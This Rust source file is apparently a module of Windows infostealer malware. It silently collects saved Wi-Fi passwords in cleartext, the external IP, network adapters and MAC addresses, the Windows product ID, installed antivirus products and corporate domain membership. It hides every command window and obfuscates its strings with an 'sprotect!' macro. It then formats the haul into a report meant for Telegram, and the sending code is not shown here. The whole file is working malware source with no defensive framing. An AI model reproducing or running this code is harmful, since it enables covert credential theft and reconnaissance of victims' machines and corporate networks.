use update::sprotect;
use std::process::Command;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

#[derive(Debug, Clone)]
pub struct WifiProfile {
    pub ssid: String,
    pub password: String,
}

#[derive(Debug, Clone)]
pub struct NetworkAdapter {
    pub name: String,
    pub ip_address: String,
    pub mac_address: String,
}

#[derive(Debug, Clone)]
pub struct SystemRecon {
    pub external_ip: String,
    pub local_adapters: Vec<NetworkAdapter>,
    pub wifi_networks: Vec<WifiProfile>,
    pub windows_key: String,
    pub av_products: Vec<String>,
    pub is_domain_joined: bool,
    pub domain_name: String,
}

impl SystemRecon {
    pub fn gather() -> Self {
        SystemRecon {
            external_ip: get_external_ip(),
            local_adapters: get_network_adapters(),
            wifi_networks: get_wifi_passwords(),
            windows_key: get_windows_product_key(),
            av_products: get_antivirus_products(),
            is_domain_joined: is_domain_joined(),
            domain_name: get_domain_name(),
        }
    }

    pub fn format_for_telegram(&self) -> String {
        let mut output = String::new();
        
        output.push_str(&sprotect!("\n🌐 NETWORK INFO:\n"));
        output.push_str(&format!("{}: {}\n", sprotect!("External IP"), self.external_ip));
        
        if !self.local_adapters.is_empty() {
            for adapter in &self.local_adapters {
                output.push_str(&format!("  {} - {} ({})\n", 
                    adapter.name, adapter.ip_address, adapter.mac_address));
            }
        }
        
        if !self.wifi_networks.is_empty() {
            output.push_str(&sprotect!("\n📡 WIFI NETWORKS:\n"));
            for wifi in &self.wifi_networks {
                if !wifi.password.is_empty() {
                    output.push_str(&format!("  {}: {}\n", wifi.ssid, wifi.password));
                } else {
                    output.push_str(&format!("  {} (no password)\n", wifi.ssid));
                }
            }
        }
        
        output.push_str(&sprotect!("\n💻 SYSTEM INFO:\n"));
        
        if !self.windows_key.is_empty() {
            output.push_str(&format!("{}: {}\n", sprotect!("Windows Key"), self.windows_key));
        }
        
        if !self.av_products.is_empty() {
            output.push_str(&format!("{}: {}\n", sprotect!("Antivirus"), self.av_products.join(", ")));
        } else {
            output.push_str(&format!("{}: {}\n", sprotect!("Antivirus"), sprotect!("None Detected")));
        }
        
        if self.is_domain_joined {
            output.push_str(&format!("{}: {} ({})\n", 
                sprotect!("Domain"), self.domain_name, sprotect!("Corporate Network")));
        } else {
            output.push_str(&format!("{}: {}\n", sprotect!("Domain"), sprotect!("WORKGROUP (Home User)")));
        }
        
        output
    }
}

fn get_external_ip() -> String {
    #[cfg(windows)]
    {
        let services = [
            sprotect!("https://api.ipify.org"),
            sprotect!("https://icanhazip.com"),
            sprotect!("https://ifconfig.me/ip"),
        ];
        
        for service in &services {
            if let Ok(output) = Command::new(sprotect!("curl"))
                .arg(sprotect!("-s"))
                .arg(sprotect!("--max-time"))
                .arg(sprotect!("5"))
                .arg(service)
                .creation_flags(0x08000000)
                .output()
            {
                if output.status.success() {
                    let ip = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    if !ip.is_empty() && ip.contains('.') {
                        return ip;
                    }
                }
            }
        }
    }
    
    sprotect!("Unknown").to_string()
}

fn get_network_adapters() -> Vec<NetworkAdapter> {
    let mut adapters = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(output) = Command::new(sprotect!("ipconfig"))
            .arg(sprotect!("/all"))
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            let mut current_adapter = String::new();
            let mut current_ip = String::new();
            let mut current_mac = String::new();
            
            for line in text.lines() {
                let line = line.trim();
                
                if line.ends_with(':') && !line.starts_with(' ') {
                    if !current_adapter.is_empty() && !current_ip.is_empty() {
                        adapters.push(NetworkAdapter {
                            name: current_adapter.clone(),
                            ip_address: current_ip.clone(),
                            mac_address: current_mac.clone(),
                        });
                    }
                    current_adapter = line.trim_end_matches(':').to_string();
                    current_ip.clear();
                    current_mac.clear();
                } else if line.contains(sprotect!("IPv4 Address").as_str()) || line.contains("IPv4") {
                    if let Some(ip) = line.split(':').nth(1) {
                        current_ip = ip.trim().trim_start_matches('.').to_string();
                    }
                } else if line.contains(sprotect!("Physical Address").as_str()) || line.contains("Physical") {
                    if let Some(mac) = line.split(':').nth(1) {
                        current_mac = mac.trim().to_string();
                    }
                }
            }
            
            if !current_adapter.is_empty() && !current_ip.is_empty() {
                adapters.push(NetworkAdapter {
                    name: current_adapter,
                    ip_address: current_ip,
                    mac_address: current_mac,
                });
            }
        }
    }
    
    adapters
}

fn get_wifi_passwords() -> Vec<WifiProfile> {
    let mut profiles = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(output) = Command::new(sprotect!("netsh"))
            .arg(sprotect!("wlan"))
            .arg(sprotect!("show"))
            .arg(sprotect!("profiles"))
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            
            for line in text.lines() {
                if line.contains(sprotect!("All User Profile").as_str()) || line.contains("Profile") {
                    if let Some(ssid) = line.split(':').nth(1) {
                        let ssid = ssid.trim().to_string();
                        
                        if let Ok(pass_output) = Command::new(sprotect!("netsh"))
                            .arg(sprotect!("wlan"))
                            .arg(sprotect!("show"))
                            .arg(sprotect!("profile"))
                            .arg(sprotect!("name"))
                            .arg(&ssid)
                            .arg(sprotect!("key"))
                            .arg(sprotect!("clear"))
                            .creation_flags(0x08000000)
                            .output()
                        {
                            let pass_text = String::from_utf8_lossy(&pass_output.stdout);
                            let mut password = String::new();
                            
                            for pass_line in pass_text.lines() {
                                if pass_line.contains(sprotect!("Key Content").as_str()) || pass_line.contains("Key") {
                                    if let Some(pass) = pass_line.split(':').nth(1) {
                                        password = pass.trim().to_string();
                                        break;
                                    }
                                }
                            }
                            
                            profiles.push(WifiProfile {
                                ssid,
                                password,
                            });
                        }
                    }
                }
            }
        }
    }
    
    profiles
}

fn get_windows_product_key() -> String {
    #[cfg(windows)]
    {
        use winreg::RegKey;
        use winreg::enums::*;
        
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        
        if let Ok(key) = hklm.open_subkey_with_flags(
            sprotect!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"),
            KEY_READ
        ) {
            if let Ok(product_id) = key.get_value::<String, _>(sprotect!("ProductId")) {
                return product_id;
            }
        }
    }
    
    sprotect!("Unknown").to_string()
}

fn get_antivirus_products() -> Vec<String> {
    let mut av_list = Vec::new();
    
    #[cfg(windows)]
    {
        if let Ok(output) = Command::new(sprotect!("wmic"))
            .arg(sprotect!("/namespace:\\\\root\\SecurityCenter2"))
            .arg(sprotect!("path"))
            .arg(sprotect!("AntiVirusProduct"))
            .arg(sprotect!("get"))
            .arg(sprotect!("displayName"))
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            
            for line in text.lines() {
                let line = line.trim();
                if !line.is_empty() && 
                   !line.contains(sprotect!("displayName").as_str()) &&
                   !line.contains("Name") {
                    av_list.push(line.to_string());
                }
            }
        }
        
        if av_list.is_empty() {
            if let Ok(output) = Command::new(sprotect!("powershell"))
                .arg(sprotect!("-Command"))
                .arg(sprotect!("Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled"))
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if text == sprotect!("True") {
                    av_list.push(sprotect!("Windows Defender (Enabled)").to_string());
                } else if text == sprotect!("False") {
                    av_list.push(sprotect!("Windows Defender (Disabled)").to_string());
                }
            }
        }
    }
    
    av_list
}

fn is_domain_joined() -> bool {
    #[cfg(windows)]
    {
        if let Ok(output) = Command::new(sprotect!("wmic"))
            .arg(sprotect!("computersystem"))
            .arg(sprotect!("get"))
            .arg(sprotect!("partofdomain"))
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            return text.contains(sprotect!("TRUE").as_str()) || text.contains("True");
        }
    }
    
    false
}

fn get_domain_name() -> String {
    #[cfg(windows)]
    {
        if let Ok(output) = Command::new(sprotect!("wmic"))
            .arg(sprotect!("computersystem"))
            .arg(sprotect!("get"))
            .arg(sprotect!("domain"))
            .creation_flags(0x08000000)
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            
            for line in text.lines() {
                let line = line.trim();
                if !line.is_empty() && 
                   !line.contains(sprotect!("Domain").as_str()) &&
                   !line.eq_ignore_ascii_case(sprotect!("WORKGROUP").as_str()) {
                    return line.to_string();
                }
            }
        }
    }
    
    sprotect!("WORKGROUP").to_string()
}
